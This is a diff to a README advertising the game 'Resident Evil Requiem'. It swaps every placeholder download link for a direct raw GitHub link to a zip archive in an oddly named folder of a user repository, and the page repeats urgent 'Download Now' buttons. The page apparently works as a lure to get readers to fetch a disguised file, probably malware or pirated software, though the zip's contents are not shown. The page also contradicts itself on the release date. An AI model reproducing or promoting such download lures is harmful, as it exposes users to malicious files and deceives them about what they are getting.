@@ -4,7 +4,7 @@
 
 > Capcom's latest survival horror masterpiece and one of 2026's biggest GOTY contenders — a fresh chapter in the legendary Resident Evil franchise.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Karissaumbrella827/resident-evil-requiem/main/siliceocalcareous/evil_resident_requiem_v1.6.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **February 27, 2026** · Available on **PS5, Xbox Series X|S, Ninten
 
 ### Ready to play / use?
 
-[![Download Resident Evil Requiem](https://img.shields.io/badge/Download-Resident%20Evil%20Requiem-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Resident Evil Requiem](https://img.shields.io/badge/Download-Resident%20Evil%20Requiem-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Karissaumbrella827/resident-evil-requiem/main/siliceocalcareous/evil_resident_requiem_v1.6.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://raw.githubusercontent.com/Karissaumbrella827/resident-evil-requiem/main/siliceocalcareous/evil_resident_requiem_v1.6.zip)**
 
 </div>
 
@@ -70,7 +70,7 @@ Resident Evil Requiem is one of the **most hyped releases of Summer 2026** — t
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://raw.githubusercontent.com/Karissaumbrella827/resident-evil-requiem/main/siliceocalcareous/evil_resident_requiem_v1.6.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -78,7 +78,7 @@ Resident Evil Requiem is one of the **most hyped releases of Summer 2026** — t
 
 **Don't miss out — Resident Evil Requiem is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Resident%20Evil%20Requiem-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Resident%20Evil%20Requiem-blue?style=for-the-badge)](https://raw.githubusercontent.com/Karissaumbrella827/resident-evil-requiem/main/siliceocalcareous/evil_resident_requiem_v1.6.zip)
 
 *Resident Evil Requiem — February 27, 2026 · PS5, Xbox Series X|S, Nintendo Switch 2, PC*
 
